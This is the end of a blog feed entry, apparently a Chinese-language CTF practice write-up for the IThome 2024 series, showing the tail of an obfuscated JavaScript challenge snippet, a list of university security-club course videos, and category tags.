class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="title function_">_0x4b5b</span>(<span class="string">"0x9"</span>));</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/Er686nJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;6 題 web&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
</feed>
